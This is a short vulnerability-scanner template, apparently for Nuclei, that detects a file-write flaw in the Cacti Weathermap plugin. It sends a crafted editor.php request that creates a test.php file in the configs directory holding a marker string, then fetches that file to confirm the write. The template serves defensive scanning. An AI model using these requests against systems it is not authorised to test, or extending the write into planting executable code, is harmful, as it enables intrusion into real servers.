id: cacti-weathermap-file-write
info:
  name: Cacti Weathermap File Write Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    This template detects a file write vulnerability in the Cacti Weathermap plugin.
  tags: file-write
http:
  - raw:
      - |
        GET /plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7 HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: status
        status:
          - 200

  - raw:
      - |
        GET /plugins/weathermap/configs/test.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "46ea1712d4b13b55b3f680cc5b8b54e8"
